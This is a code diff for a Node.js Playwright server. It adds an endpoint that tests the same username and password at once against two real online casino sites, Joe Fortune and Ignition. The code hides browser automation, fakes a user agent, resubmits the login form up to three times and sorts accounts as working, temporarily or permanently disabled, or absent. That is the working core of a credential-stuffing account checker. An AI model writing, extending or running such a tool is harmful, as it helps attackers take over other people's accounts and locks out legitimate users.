@@ -1195,6 +1195,220 @@ async function classifyLoginOutcome(page, site) {
   }
 }
 
+// ── PAIRED MODE (experimental — completely isolated from single-site flow) ──
+// Adds a new automation lane that opens TWO live browser windows side-by-side
+// (Joe on the left, Ignition on the right) and tests the SAME credential
+// pair in parallel against both sites. Implemented as 100% additive code:
+// nothing in the existing /api/login-check or single-site flow is touched.
+const pairBrowserPool = { joeSlot: null, ignSlot: null };
+async function getPairBrowser(slot) {
+  const existing = pairBrowserPool[slot];
+  if (existing && existing.isConnected()) return existing;
+  const xy = slot === 'joeSlot' ? '40,40' : '600,40';
+  const args = [
+    '--no-sandbox', '--disable-setuid-sandbox',
+    '--disable-blink-features=AutomationControlled', '--disable-infobars',
+    '--window-size=540,840', `--window-position=${xy}`,
+  ];
+  const b = await chromium.launch({ headless: false, args, slowMo: 120 });
+  b.on('disconnected', () => { if (pairBrowserPool[slot] === b) pairBrowserPool[slot] = null; });
+  pairBrowserPool[slot] = b;
+  logEvent('info', 'pair.browser.launched', { slot });
+  return b;
+}
+let _pairChain = Promise.resolve();
+function runPairExclusive(fn) {
+  const next = _pairChain.then(() => fn(), () => fn());
+  _pairChain = next.catch(() => {});
+  return next;
+}
+
+/**
+ * One side of the paired login. Mirrors single-site logic (3 submits, freeze
+ * navigation, classify, screenshots) but runs against a pre-allocated browser
+ * for its dedicated window slot. Returns a per-side result object.
+ */
+async function runPairSide({ slot, siteId, username, password, loginUrl, timeout, postSubmitWait, runId, signal }) {
+  const sideTag = `${siteId}_pair`;
+  const shotBufs = [null, null, null, null];
+  const shotUrls = ['', '', '', ''];
+  const shotDataUrls = ['', '', '', ''];
+  let outcome = 'noAcc';
+  let note = 'Paired check did not complete';
+  let attemptLog = [];
+  let context;
+  const persist = async (buf, i) => {
+    shotBufs[i] = buf;
+    const meta = await persistShotBuffer(buf, `${runId}-${sideTag}`, i + 1);
+    shotUrls[i] = meta.url;
+    shotDataUrls[i] = meta.dataUrl;
+    return meta.dataUrl;
+  };
+  try {
+    const browser = await getPairBrowser(slot);
+    context = await browser.newContext({
+      viewport: { width: 540, height: 840 },
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+      ignoreHTTPSErrors: true,
+    });
+    const page = await context.newPage();
+    page.setDefaultTimeout(timeout);
+    const netSnap = attachNetworkHooks(page);
+    const bail = () => { if (signal && signal.aborted) throw new Error('run cancelled'); };
+    let frozen = false;
+    await page.route('**/*', (route) => {
+      try {
+        const req = route.request();
+        if (frozen && req.resourceType() === 'document' && req.isNavigationRequest() && req.frame() === page.mainFrame()) {
+          return route.abort();
+        }
+      } catch {}
+      return route.continue();
+    });
+
+    bail();
+    try {
+      await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
+    } catch (navErr) {
+      note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
+      const buf = await captureShotBuf(page, 'PAIR 1/4').catch(() => null);
+      await persist(buf, 0); await persist(buf, 1); await persist(buf, 2); await persist(buf, 3);
+      return { siteId, outcome: 'noAcc', note, shotUrls, shots: shotDataUrls, attempts: attemptLog };
+    }
+    await page.waitForTimeout(2000);
+    await dismissCookiePopup(page);
+    await fillLoginForm(page, username, password);
+    await page.waitForTimeout(700);
+    bail();
+    await persist(await captureShotBuf(page, 'PAIR 1/4').catch(() => null), 0);
+
+    frozen = true;
+    await page.evaluate(() => {
+      try {
+        window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; }, true);
+        const noop = () => {};
+        try { window.location.assign  = noop; } catch {}
+        try { window.location.replace = noop; } catch {}
+        try { window.location.reload  = noop; } catch {}
+        document.addEventListener('submit', (e) => {
+          try { if (e.target && e.target.tagName === 'FORM') e.preventDefault(); } catch {}
+        }, true);
+      } catch {}
+    }).catch(() => {});
+
+    const MAX_ATTEMPTS = 3;
+    let classification = { type: 'UNKNOWN' };
+    let attempts = 0;
+    let prevAttemptBuf = null;
+    for (let n = 1; n <= MAX_ATTEMPTS; n++) {
+      bail();
+      const pwdLoc = page.locator('input[type="password"]:visible').first();
+      if (await pwdLoc.isVisible({ timeout: 200 }).catch(() => false)) {
+        const val = await pwdLoc.inputValue().catch(() => '');
+        if (!val) await fillLoginForm(page, username, password).catch(() => {});
+      }
+      const clicked = await clickSubmit(page).catch(() => false);
+      if (!clicked) await page.keyboard.press('Enter').catch(() => {});
+      await page.waitForTimeout(postSubmitWait).catch(() => {});
+      await dismissCookiePopup(page).catch(() => {});
+      bail();
+      const buf  = await captureShotBuf(page, `pair-attempt-${n}`).catch(() => null);
+      const html = await page.content().catch(() => '');
+      await persistAttemptArtifacts(buf, html, `${runId}-${sideTag}`, n);
+      const diffStats = await persistAttemptDiff(prevAttemptBuf, buf, `${runId}-${sideTag}`, n);
+      prevAttemptBuf = buf;
+      if (n === 1) await persist(buf, 1);
+      await persist(buf, 2);
+      attempts = n;
+      classification = await classifyLoginOutcome(page, siteId);
+      attemptLog.push({
+        n, type: classification.type,
+        ...(classification.perm != null ? { perm: classification.perm } : {}),
+        ...(diffStats ? { diff: { url: diffStats.url, changedPixels: diffStats.changedPixels, changedPct: diffStats.changedPct } } : {}),
+      });
+    }
+
+    const siteName = siteId === 'ign' ? 'Ignition' : 'Joe Fortune';
+    if (classification.type === 'SUCCESS') {
+      outcome = 'working';
+      note = `${siteName} — pair login successful (attempt ${attempts}/${MAX_ATTEMPTS})`;
+    } else if (classification.type === 'DISABLED' && classification.perm) {
+      outcome = 'permDisabled';
+      note = `${siteName} — account permanently disabled`;
+    } else if (classification.type === 'DISABLED') {
+      outcome = 'tempDisabled';
+      note = `${siteName} — temporarily disabled (too many failed attempts)`;
+    } else if (classification.type === 'BAD_CREDS') {
+      outcome = 'noAcc';
+      note = `${siteName} — incorrect credentials after ${attempts} attempt(s)`;
+    } else {
+      outcome = 'noAcc';
+      note = `${siteName} — no conclusive signal after ${attempts} attempt(s)`;
+    }
+    if (netSnap && outcome === 'noAcc' && netSnap.authSuccess && !netSnap.authFailure) {
+      outcome = 'working';
+      note = `${siteName} — pair success confirmed by network auth response`;
+    }
+
+    await page.waitForTimeout(2000).catch(() => {});
+    await dismissCookiePopup(page).catch(() => {});
+    bail();
+    await persist(await captureShotBuf(page, 'PAIR 4/4').catch(() => null), 3);
+
+    await context.clearCookies().catch(() => {});
+    await page.evaluate(() => { try { localStorage.clear(); sessionStorage.clear(); } catch {} }).catch(() => {});
+  } catch (err) {
+    note = `Pair side error: ${err.message}`;
+    outcome = 'noAcc';
+    logEvent('error', 'pair.side.error', { runId, siteId, error: err.message });
+  } finally {
+    if (context) await context.close().catch(() => {});
+  }
+  return { siteId, outcome, note, shotUrls, shots: shotDataUrls, attempts: attemptLog };
+}
+
+/**
+ * POST /api/login-check-pair
+ * Runs the same credential against Joe + Ignition simultaneously in two
+ * separate visible browser windows.
+ *
+ * Body: { username, password, joeUrl, ignUrl, timeout?, postSubmitWait? }
+ * Returns: { runId, joe: {...}, ign: {...} }
+ */
+app.post('/api/login-check-pair', async (req, res) => {
+  const {
+    username, password,
+    joeUrl, ignUrl,
+    timeout = NAV_TIMEOUT,
+    postSubmitWait: postSubmitWaitRaw,
+  } = req.body;
+  const postSubmitWait = Math.max(500, Math.min(15000, parseInt(postSubmitWaitRaw) || 3000));
+  if (!username || !password || !joeUrl || !ignUrl) {
+    return res.status(400).json({ error: 'Missing username, password, joeUrl, or ignUrl' });
+  }
+  const runHandle = startRun({ kind: 'pair', username, joeUrl, ignUrl });
+  await runPairExclusive(async () => {
+    const signal = runHandle.controller.signal;
+    let joeRes, ignRes;
+    try {
+      [joeRes, ignRes] = await Promise.all([
+        runPairSide({ slot: 'joeSlot', siteId: 'joe', username, password, loginUrl: joeUrl, timeout, postSubmitWait, runId: runHandle.runId, signal }),
+        runPairSide({ slot: 'ignSlot', siteId: 'ign', username, password, loginUrl: ignUrl, timeout, postSubmitWait, runId: runHandle.runId, signal }),
+      ]);
+    } catch (err) {
+      logEvent('error', 'pair.run.error', { runId: runHandle.runId, error: err.message });
+    } finally {
+      endRun(runHandle, { kind: 'pair', username });
+    }
+    broadcast('pair.result', { runId: runHandle.runId, username, joe: joeRes, ign: ignRes });
+    if (!res.headersSent) res.json({
+      runId: runHandle.runId,
+      joe: joeRes || { outcome: 'noAcc', note: 'Joe side failed to start', shotUrls: ['','','',''], shots: ['','','',''], attempts: [] },
+      ign: ignRes || { outcome: 'noAcc', note: 'Ignition side failed to start', shotUrls: ['','','',''], shots: ['','','',''], attempts: [] },
+    });
+  });
+});
+
 /**
  * POST /api/login-check
  * Performs a real Playwright login attempt against the target casino site.
